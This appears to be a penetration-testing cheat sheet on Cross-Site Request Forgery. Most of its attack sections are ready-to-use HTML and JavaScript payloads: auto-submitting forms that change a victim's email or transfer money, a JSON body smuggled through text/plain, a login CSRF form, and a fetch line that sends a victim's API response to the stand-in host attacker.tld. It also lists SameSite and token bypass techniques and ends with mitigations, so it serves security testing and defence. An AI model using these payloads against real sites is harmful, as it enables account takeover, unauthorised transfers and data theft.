# Cross-Site Request Forgery (CSRF)

> CSRF tricks an authenticated user's browser into sending a state-changing request to a vulnerable application that trusts the session cookie.

## Summary

- [Detection](#detection)
- [HTML PoCs](#html-pocs)
- [JSON CSRF](#json-csrf)
- [CORS-Assisted CSRF](#cors-assisted-csrf)
- [SameSite Bypass](#samesite-bypass)
- [Token Bypass](#token-bypass)
- [Login CSRF](#login-csrf)
- [Mitigation](#mitigation)
- [References](#references)

## Detection

A request is CSRF-vulnerable when **all** of the following hold:

1. It causes a state change (POST/PUT/DELETE — or a GET that mutates).
2. Authentication is purely cookie-based (no per-request token, no SameSite).
3. The parameters are predictable.

## HTML PoCs

### GET-based

```html
<img src="https://target.tld/account/transfer?to=attacker&amount=10000">
```

### POST-based — classic

```html
<html><body onload="document.forms[0].submit()">
<form action="https://target.tld/account/email" method="POST">
  <input name="email" value="attacker@evil.tld">
</form>
</body></html>
```

### Multipart upload

```html
<form action="https://target.tld/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
</form>
```

(You can pre-fill files with the [File constructor](https://developer.mozilla.org/en-US/docs/Web/API/File/File) in JS via `DataTransfer`.)

## JSON CSRF

If the server accepts `text/plain` or doesn't enforce `Content-Type`:

```html
<form action="https://target.tld/api/transfer" method="POST" enctype="text/plain">
  <input name='{"to":"attacker","amount":1000,"ignore":"' value='"}'>
</form>
```

This produces: `{"to":"attacker","amount":1000,"ignore":"="}` as request body.

### Flash-based (legacy)

No longer practical post-Flash EOL, but historically used `crossdomain.xml` weaknesses.

## CORS-Assisted CSRF

If `Access-Control-Allow-Origin: *` is set but `Access-Control-Allow-Credentials: true` is **not**, attackers can read **public** responses cross-origin. Combined with bearer tokens in URLs etc., this can leak data.

If `Access-Control-Allow-Origin` reflects arbitrary origins **and** credentials are allowed:

```javascript
fetch('https://target.tld/api/me', {credentials:'include'})
  .then(r=>r.text()).then(t=>fetch('https://attacker.tld/?d='+btoa(t)));
```

## SameSite Bypass

| SameSite | Cross-site GET | Cross-site POST |
|----------|----------------|-----------------|
| `Strict` | No | No |
| `Lax` (default modern) | Yes (top-level) | No |
| `None` | Yes | Yes |

### `Lax` GET methods

If a state-changing endpoint accepts GET:

```html
<a href="https://target.tld/transfer?to=x&amount=1">Click here</a>
```

### 2-minute window in Chromium

Cookies set without `SameSite` get `Lax` after a 2-minute grace window. Within the window, cross-site POSTs may still succeed.

### Sister-domain abuse

`evil.target.tld` (controlled by attacker via subdomain takeover or vendor) bypasses SameSite restrictions because it's same-site.

## Token Bypass

### Token not validated

Drop the token field entirely → still accepted.

### Token validated only when present

Send empty `csrf=` or omit it.

### Token tied to session that is not the victim's

Swap the token with one from an attacker session.

### Token in cookie, validated against same cookie

Cookie value is reflected as the token — attacker can set both via subdomain to the same value (double-submit-cookie flaw when cookie scope is too broad).

### Token leaked via Referer

If `target.tld/profile?csrf=xxxx` is linked from a page that the attacker can host content on.

## Login CSRF

Force the victim to log into an attacker-controlled account, so future actions (search history, saved CC, etc.) are recorded under it.

```html
<form action="https://target.tld/login" method="POST">
  <input name="user" value="attackeraccount">
  <input name="pass" value="attackerpass">
</form>
<script>document.forms[0].submit()</script>
```

## Mitigation

- **CSRF token** in a custom header (`X-CSRF-Token`) **or** synchronizer token pattern, validated server-side.
- **SameSite=Lax** (default) or **Strict** on session cookies.
- **Origin / Referer** header validation as a second layer.
- For JSON endpoints, **require** `Content-Type: application/json` AND a custom header — both block simple cross-origin POSTs from forms.
- Avoid state-changing GETs.
- Re-authenticate for sensitive actions (password change, transfer).

## References

- [OWASP — CSRF](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [SameSite Cookies Explained — web.dev](https://web.dev/samesite-cookies-explained/)
